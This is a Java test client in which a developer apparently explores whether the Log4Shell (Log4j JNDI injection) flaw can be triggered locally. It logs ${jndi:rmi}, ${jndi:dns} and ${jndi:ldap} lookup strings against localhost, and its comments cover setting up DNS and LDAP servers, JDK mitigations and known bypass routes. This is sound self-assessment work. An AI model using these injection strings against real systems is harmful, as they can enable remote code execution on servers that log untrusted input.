import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.Context;

public class Client {

    public static void main(String[] args) throws Exception {
        // standard rmi, just to test if the server is working:
        // Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        // Object server = registry.lookup("malicious");
        // System.out.println(server);

        // rmi class loading is disabled in jdk 11 by default. the following error is thrown:
        // no security manager: RMI class loader disabled

        // to avoid the following:
        //      Error looking up JNDI resource [java://localhost:1099/malicious].
        //      javax.naming.NoInitialContextException: Need to specify class name in environment or system property,
        //      or in an application resource file: java.naming.factory.initial
        // the content is irrelevant, because most application servers will have an initial context
        // factory implementation already set up
        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");

        Logger log = LogManager.getLogger(Client.class);
        log.log(Level.ERROR, () -> "is this also interpolated? yes! and malicious code is executed ${jndi:rmi://localhost:1099/malicious}");
        // so if the server runs in an environment where it has access to the outside world, the binary code is fetched
        // it's static initialiser can do anything you want it to.
        // UPDATE that isn't quite true - if as in this project, the class files arent local, then you can
        // set some system props on the server to make them loadable,  but the RMIClassLoader refuses to load them
        // unless a security manager is in place, which I think isn't the case if there is no policy file in the client
        // which would allow the class to be loaded.

        System.setProperty(Context.OBJECT_FACTORIES, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        // what about dns and an object in a txt record?
        log.log(Level.ERROR, () -> "is this also interpolated? yes! and malicious code is executed ${jndi:dns://localhost:53/ant.com/asdf}");
        // using:
        //      sudo apt-get install dnsmasq
        //      sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
        //      sudo vi /etc/dnsmasq.conf
        // then adding:
        //      txt-record=ant.com/asdf,"pathed"
        // restart:
        //      systemctl restart dnsmasq.service
        // test:
        //      dig -t txt ant.com
        // after reading the record, the jvm does attempt to search for object factories. if the following one were
        // registered, which might be the case in an application server that has EJB support, then there could be a
        // chance that the object would be instantiated and static code in the class could be executed.
        //     System.setProperty(Context.OBJECT_FACTORIES, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        // but it doesnt appear to work.
        // java 11:
        //      Caused by: java.lang.IllegalAccessException: class com.sun.naming.internal.FactoryEnumeration
        //          (in module java.naming) cannot access class com.sun.jndi.rmi.registry.RegistryContextFactory
        //          (in module jdk.naming.rmi) because module jdk.naming.rmi does not export com.sun.jndi.rmi.registry
        //          to module java.naming
        // there doesnt seem to be a way around that, unless the client had recompiled libs. unlikely.
        // java 8:
        // the RegistryContextFactory contains a check which calls isRegistryRef and that returns false if the object
        // it is checking is not Reference. it isnt, because its an instance of DnsContext.

        // TODO investigate the LDAP example here: https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j
        // because perhaps java's ldap isn't as good at preventing problems?

        // ldap server install
        // https://computingforgeeks.com/install-and-configure-openldap-server-ubuntu/
        //
        // sudo apt update
        // sudo apt -y install slapd ldap-utils
        // <enter "password" as the admin password>
        // # had some issues. so reconfigured it using maxant.ch:
        // sudo dpkg-reconfigure slapd
        // # output directory contents:
        // sudo slapcat
        // #add the java schema:
        // ldapadd -x -D cn=admin,cn=config -W -f /etc/ldap/schema/java.ldif
        // note that i screwed around until that worked:
        //   eg trying to reset the admin password: https://www.digitalocean.com/community/tutorials/how-to-change-account-passwords-on-an-openldap-server
        //   eg trying to include the java schema in /etc/ldap/ldap.conf: https://www.openldap.org/doc/admin24/schema.html
        // #then add the contects of the ldif file:
        // ldapadd -x -D cn=admin,dc=maxant,dc=ch -W -f basedn.ldif
        // # if you need to generate a password:
        // sudo slappasswd
        // <enter "password">
        // that provides a string you can use in eg. the config file.
        // also tried this, but it didnt actually do owt:
        // https://docs.oracle.com/javase/jndi/tutorial/config/LDAP/CreateJavaSchema.java

        log.log(Level.ERROR, () -> "is this also interpolated? yes! and malicious code is executed ${jndi:ldap://localhost:389/cn=log4j,dc=maxant,dc=ch}");

        // doesnt appear to work because of this in com.sun.naming.internal.VersionHelper:
        //         // System property to control whether classes may be loaded from an
        //        // arbitrary URL code base
        //        PrivilegedAction<String> act
        //                = () -> System.getProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
        //  that class contains this method:
        //
        //     public Class<?> loadClass(String className, String codebase)
        //            throws ClassNotFoundException, MalformedURLException {
        //        if (TRUST_URL_CODE_BASE) {
        //            ClassLoader parent = getContextClassLoader();
        //            ClassLoader cl
        //                    = URLClassLoader.newInstance(getUrlArray(codebase), parent);
        //            return loadClass(className, cl);
        //        } else {
        //            return null;
        //        }
        //    }

        // seems as tho java 11 closed any holes. BUT:
        // see https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
        // see https://www.veracode.com/blog/research/exploiting-jndi-injections-java
        // by setting the javafactory to an instance of ObjectFactory that is already in the classpath, you can
        // get it to execute stuff for you. examples of bad implementations exist in tomcat and websphere.
        // checked out quarkus 1.x classpath, nothing dodgy located.
        // summary, i think im safe. dont think i use log4j2 anyway in prod
        // lessons learned: dont do param replacement on strings supplied by the user! why log4j allows that is a
        // mystery. i'd only allow it in patterns, not in actual log statements. weird.

        System.out.println("done");
    }
}
